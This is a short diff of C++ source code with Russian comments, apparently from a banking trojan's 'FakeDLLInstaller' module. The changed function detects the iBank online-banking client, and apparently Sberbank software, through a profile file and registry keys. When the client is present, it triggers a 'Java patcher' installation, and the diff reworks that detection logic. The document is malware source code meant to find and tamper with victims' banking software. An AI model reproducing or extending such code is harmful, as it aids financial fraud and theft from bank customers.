@@ -739,24 +739,31 @@ namespace FDI
 		// Проверяем наличие файла
 		string FileNameName = GetSpecialFolderPathA(CSIDL_PROFILE, GetStr(EStrIBankFileName));
 
-		if (File::IsExists(FileNameName.t_str()))
+		bool Result = File::IsExists(FileNameName.t_str());
+
+
+
+
+		if (!Result)
 		{
-			FKIDBG("FakeDLLInstaller", "Найден файл ИБанка %s", FileNameName.t_str());
-			// При включенном фва патчере запускаем установку
-			#ifdef JAVS_PATCHERHvd
-            	JavaPatcherSignal(NULL);
-			#endif
+			// Проверяем реестр
 
-			return true;
-		}
+			FKIDBG("FakeDLLInstaller", "Проверяем ключи реестра");
+			string Tmp = GetStr(EStrSberRegistryKey);
 
-		FKIDBG("FakeDLLInstaller", "Проверяем ключи реестра");
-		// Проверяем реестр
-		string Tmp = GetStr(EStrSberRegistryKey);
-
-		bool Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
+			Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
 					  Registry::IsKeyExist(HKEY_LOCAL_MACHINE, Tmp.t_str()) ||
 					  Registry::IsKeyExist(HKEY_CURRENT_USER,  Tmp.t_str());
+        }
+
+		if (Result)
+		{
+			FKIDBG("FakeDLLInstaller", "Найдено присутствие ИБанка");
+			// При включенном фва патчере запускаем установку
+			#ifdef JAVS_PATCHERHvd
+				JavaPatcherSignal(NULL);
+			#endif
+		}
 
 		return Result;
 
@@ -833,7 +840,6 @@ namespace FDI
 	}
     //-------------------------------------------------------------------------
 }
-
 
 
 
